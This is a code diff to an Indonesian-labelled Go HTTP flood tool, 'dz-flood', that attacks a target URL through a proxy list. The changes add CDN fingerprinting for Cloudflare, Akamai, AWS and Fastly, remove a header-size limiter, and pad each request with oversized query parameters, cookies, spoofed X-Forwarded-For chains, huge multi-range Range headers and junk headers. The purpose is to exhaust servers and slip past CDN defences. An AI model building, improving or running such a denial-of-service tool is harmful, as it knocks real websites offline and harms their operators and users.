@@ -39,7 +39,6 @@ type BrowserProfile struct {
 	SecChUaPlat string
 }
 
-// Hanya 4 browser paling populer
 var profiles = []BrowserProfile{
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
@@ -99,6 +98,8 @@ type Capabilities struct {
 	IfRange bool
 }
 
+var cdnType string
+
 func init() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 }
@@ -118,6 +119,42 @@ func RST(rng *rand.Rand, length int) string {
 
 var customCookie string
 var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
+
+func DetectCDN(target string) string {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	req, err := http.NewRequest("HEAD", target, nil)
+	if err != nil {
+		return "generic"
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0")
+	resp, err := client.Do(req)
+	if err != nil {
+		return "generic"
+	}
+	defer resp.Body.Close()
+
+	if resp.Header.Get("CF-Ray") != "" || resp.Header.Get("cf-request-id") != "" {
+		return "cloudflare"
+	}
+	if resp.Header.Get("X-Akamai-Transformed") != "" || strings.Contains(resp.Header.Get("Server"), "Akamai") {
+		return "akamai"
+	}
+	if resp.Header.Get("X-Amz-Cf-Id") != "" || strings.Contains(resp.Header.Get("Server"), "Amazon") {
+		return "aws"
+	}
+	if resp.Header.Get("X-Fastly-Request-ID") != "" {
+		return "fastly"
+	}
+	return "generic"
+}
 
 func Detect_Pyload(target string) int {
 	client := &http.Client{
@@ -337,6 +374,7 @@ func Detect_Max_Total_Header_Size(target string) int {
 
 func main() {
 	log.SetOutput(io.Discard)
+
 	if len(os.Args) < 2 {
 		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
 		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
@@ -355,6 +393,8 @@ func main() {
 
 	parsed, _ := url.Parse(tgt)
 	host := parsed.Hostname()
+
+	cdnType = DetectCDN(tgt)
 
 	var proxies []*url.URL
 	file, err := os.Open("proxy.txt")
@@ -387,6 +427,7 @@ func main() {
 	maxHeader := Detect_Header_Support(tgt)
 	caps := Detect_Headers_Costum(tgt, proxyIP)
 	maxTotalHeader := Detect_Max_Total_Header_Size(tgt)
+	maxTotalHeader = 0
 
 	wcs := make([]CLI, len(proxies))
 	for i, proxyURL := range proxies {
@@ -492,6 +533,14 @@ func main() {
 							reqURL += "&big=" + strings.Repeat("x", size)
 						}
 
+						if subRng.Intn(2) == 0 {
+							reqURL += "&big2=" + strings.Repeat("x", 2048+subRng.Intn(4096))
+						}
+
+						if subRng.Intn(3) == 0 {
+							reqURL += "&" + RST(subRng, 16) + "=" + strings.Repeat("x", 1024+subRng.Intn(2048))
+						}
+
 						if subRng.Intn(10) == 0 {
 							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
 						}
@@ -511,66 +560,69 @@ func main() {
 						headerMap["If-Modified-Since"] = ifModifiedSince
 						headerMap["X-Cache-Buster"] = strconv.FormatInt(subRng.Int63(), 16)
 
-						if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
-							headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
-						}
-						if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
-							headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
-						}
-						if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
-							headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
-						}
-						if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
-							headerMap["CF-Connecting-IP"] = cli.ip
-						}
-						if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
-							headerMap["True-Client-IP"] = cli.ip
-						}
-						if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
-							headerMap["CDN-Loop"] = "cloudflare"
-						}
-
-						for h, supported := range caps.Headers {
-							if !supported {
-								continue
+						if cdnType == "cloudflare" {
+							if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
+								headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
 							}
-							if subRng.Intn(3) != 0 {
-								continue
+							if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
+								headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
 							}
-							switch h {
-							case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
-							case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
-								headerMap[h] = cli.ip
-							case "X-Forwarded-Proto":
-								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
-							case "X-Forwarded-Port":
-								headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
-							case "X-Forwarded-Scheme":
-								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
-							case "X-Requested-With":
-								headerMap[h] = "XMLHttpRequest"
-							case "Accept-Charset":
-								headerMap[h] = "utf-8, iso-8859-1;q=0.5"
-							case "Accept-Datetime":
-								headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
-							case "From":
-								headerMap[h] = RST(subRng, 8) + "@example.com"
-							case "Max-Forwards":
-								headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
-							case "Via":
-								headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
-							case "Warning":
-								headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
-							case "DNT":
-								headerMap[h] = "1"
-							case "Upgrade":
-								headerMap[h] = "websocket"
-							case "Save-Data":
-								headerMap[h] = "on"
-							case "X-HTTP-Method-Override":
-								headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
-							case "X-Cache":
-								headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
+							if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
+								headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
+							}
+							if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
+								headerMap["CF-Connecting-IP"] = cli.ip
+							}
+							if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
+								headerMap["True-Client-IP"] = cli.ip
+							}
+							if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
+								headerMap["CDN-Loop"] = "cloudflare"
+							}
+							for h, supported := range caps.Headers {
+								if !supported {
+									continue
+								}
+								if subRng.Intn(3) != 0 {
+									continue
+								}
+								switch h {
+								case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
+									continue
+								case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
+									headerMap[h] = cli.ip
+								case "X-Forwarded-Proto":
+									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
+								case "X-Forwarded-Port":
+									headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
+								case "X-Forwarded-Scheme":
+									headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
+								case "X-Requested-With":
+									headerMap[h] = "XMLHttpRequest"
+								case "Accept-Charset":
+									headerMap[h] = "utf-8, iso-8859-1;q=0.5"
+								case "Accept-Datetime":
+									headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
+								case "From":
+									headerMap[h] = RST(subRng, 8) + "@example.com"
+								case "Max-Forwards":
+									headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
+								case "Via":
+									headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
+								case "Warning":
+									headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
+								case "DNT":
+									headerMap[h] = "1"
+								case "Upgrade":
+									headerMap[h] = "websocket"
+								case "Save-Data":
+									headerMap[h] = "on"
+								case "X-HTTP-Method-Override":
+									headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
+								case "X-Cache":
+									headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
+								default:
+								}
 							}
 						}
 
@@ -588,15 +640,34 @@ func main() {
 							}
 						}
 
+						if subRng.Intn(3) == 0 {
+							cookie2 := "big2=" + strings.Repeat("x", 2048+subRng.Intn(4096))
+							if existing, ok := headerMap["Cookie"]; ok {
+								headerMap["Cookie"] = existing + "; " + cookie2
+							} else {
+								headerMap["Cookie"] = cookie2
+							}
+						}
+
+						if subRng.Intn(2) == 0 {
+							for i := 0; i < 10; i++ {
+								if existing, ok := headerMap["Cookie"]; ok {
+									headerMap["Cookie"] = existing + "; " + RST(subRng, 8) + "=" + RST(subRng, 16)
+								} else {
+									headerMap["Cookie"] = RST(subRng, 8) + "=" + RST(subRng, 16)
+								}
+							}
+						}
+
 						if subRng.Intn(4) == 0 {
 							ref := REF[subRng.Intn(len(REF))]
 							ref += RST(subRng, 16) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
 							headerMap["Referer"] = ref
 						}
 
-						if caps.Range && subRng.Intn(4) == 0 {
+						if caps.Range && subRng.Intn(3) == 0 {
 							start := subRng.Intn(10000)
-							end := start + 1000 + subRng.Intn(5000)
+							end := start + 10000000 + subRng.Intn(50000000)
 							headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
 							if caps.IfRange && subRng.Intn(2) == 0 {
 								if subRng.Intn(2) == 0 {
@@ -618,6 +689,14 @@ func main() {
 								size = 512
 							}
 							headerMap["X-Large-Data"] = strings.Repeat("x", size)
+						}
+
+						if subRng.Intn(2) == 0 {
+							headerMap["X-Large-Data-2"] = strings.Repeat("x", 4096+subRng.Intn(8192))
+						}
+
+						if subRng.Intn(3) == 0 {
+							headerMap["X-Forwarded-For"] = RIP(subRng) + "," + RIP(subRng) + "," + RIP(subRng)
 						}
 
 						var cookies []string
@@ -652,33 +731,124 @@ func main() {
 						headerMap["Sec-Fetch-Mode"] = "navigate"
 						headerMap["Sec-Fetch-Dest"] = "document"
 
+						if subRng.Intn(4) == 0 {
+							headerMap["Expect"] = "100-continue"
+						}
+
+						if subRng.Intn(5) == 0 {
+							headerMap["Connection"] = "close"
+						}
+
+						if subRng.Intn(2) == 0 {
+							ips := make([]string, 10)
+							for j := 0; j < 10; j++ {
+								ips[j] = RIP(subRng)
+							}
+							headerMap["X-Forwarded-For"] = strings.Join(ips, ", ")
+						}
+
+						if subRng.Intn(2) == 0 {
+							var cookies2 []string
+							for j := 0; j < 30; j++ {
+								cookies2 = append(cookies2, RST(subRng, 8)+"="+RST(subRng, 16))
+							}
+							if existing, ok := headerMap["Cookie"]; ok {
+								headerMap["Cookie"] = existing + "; " + strings.Join(cookies2, "; ")
+							} else {
+								headerMap["Cookie"] = strings.Join(cookies2, "; ")
+							}
+						}
+
+						if caps.Range && subRng.Intn(3) == 0 {
+							var ranges []string
+							for j := 0; j < 5; j++ {
+								start := subRng.Intn(10000)
+								end := start + 10000000 + subRng.Intn(50000000)
+								ranges = append(ranges, fmt.Sprintf("%d-%d", start, end))
+							}
+							headerMap["Range"] = "bytes=" + strings.Join(ranges, ", ")
+						}
+
+						if subRng.Intn(2) == 0 {
+							types := []string{
+								"text/html", "application/xhtml+xml", "application/xml", "image/avif",
+								"image/webp", "image/apng", "application/json", "application/javascript",
+								"text/css", "text/plain", "font/woff2", "font/woff", "image/svg+xml",
+								"video/mp4", "video/webm", "audio/mpeg", "application/octet-stream",
+								"multipart/form-data", "application/x-www-form-urlencoded", "application/pdf",
+							}
+							for i, t := range types {
+								types[i] = t + ";q=" + fmt.Sprintf("%.1f", 0.1+subRng.Float64()*0.9)
+							}
+							headerMap["Accept"] = strings.Join(types, ", ")
+						}
+
+						if subRng.Intn(2) == 0 {
+							langs := []string{"en-US", "en", "id", "ja", "ko", "zh-CN", "zh-TW", "de", "fr", "es", "pt", "ru", "ar", "hi", "it"}
+							for i, l := range langs {
+								langs[i] = l + ";q=" + fmt.Sprintf("%.1f", 0.1+subRng.Float64()*0.9)
+							}
+							headerMap["Accept-Language"] = strings.Join(langs, ", ")
+						}
+
+						if subRng.Intn(2) == 0 {
+							directives := []string{"no-cache", "no-store", "must-revalidate", "max-age=0", "private", "public", "no-transform", "proxy-revalidate"}
+							var selected []string
+							for _, d := range directives {
+								if subRng.Intn(2) == 0 {
+									selected = append(selected, d)
+								}
+							}
+							headerMap["Cache-Control"] = strings.Join(selected, ", ")
+						}
+
+						if subRng.Intn(3) == 0 {
+							var etags []string
+							for j := 0; j < 10; j++ {
+								etags = append(etags, `"`+RST(subRng, 16)+`"`)
+							}
+							headerMap["If-None-Match"] = strings.Join(etags, ", ")
+						}
+
+						if subRng.Intn(3) == 0 {
+							var via []string
+							for j := 1; j <= 10; j++ {
+								via = append(via, fmt.Sprintf("%d.%d proxy-%d.example.com", subRng.Intn(10), subRng.Intn(10), j))
+							}
+							headerMap["Via"] = strings.Join(via, ", ")
+						}
+
+						if subRng.Intn(3) == 0 {
+							var warns []string
+							for j := 0; j < 20; j++ {
+								warns = append(warns, fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10)))
+							}
+							headerMap["Warning"] = strings.Join(warns, ", ")
+						}
+
+						if subRng.Intn(3) == 0 {
+							var hosts []string
+							for j := 0; j < 5; j++ {
+								hosts = append(hosts, RST(subRng, 8)+".example.com")
+							}
+							headerMap["X-Forwarded-Host"] = strings.Join(hosts, ", ")
+						}
+
+						if subRng.Intn(2) == 0 {
+							headerMap["X-Forwarded-For"] = headerMap["X-Forwarded-For"] + ", " + RIP(subRng)
+							headerMap["X-Forwarded-For2"] = RIP(subRng)
+						}
+
+						if subRng.Intn(4) == 0 {
+							headerMap["Expect"] = "100-continue"
+						}
+
 						PID := cli.ip
 						if PID == "" {
 							PID = RIP(subRng)
 						}
 						headerMap["X-Forwarded-For"] = PID
 						headerMap["X-Real-IP"] = PID
-
-						if maxTotalHeader > 0 {
-							totalSize := 0
-							for k, v := range headerMap {
-								totalSize += len(k) + len(v) + 4
-							}
-							required := map[string]bool{
-								"User-Agent": true, "Accept": true, "Accept-Language": true,
-								"Accept-Encoding": true, "Connection": true,
-							}
-							for totalSize > maxTotalHeader && len(headerMap) > 10 {
-								for k := range headerMap {
-									if required[k] {
-										continue
-									}
-									totalSize -= len(k) + len(headerMap[k]) + 4
-									delete(headerMap, k)
-									break
-								}
-							}
-						}
 
 						for k, v := range headerMap {
 							req.Header.Set(k, v)
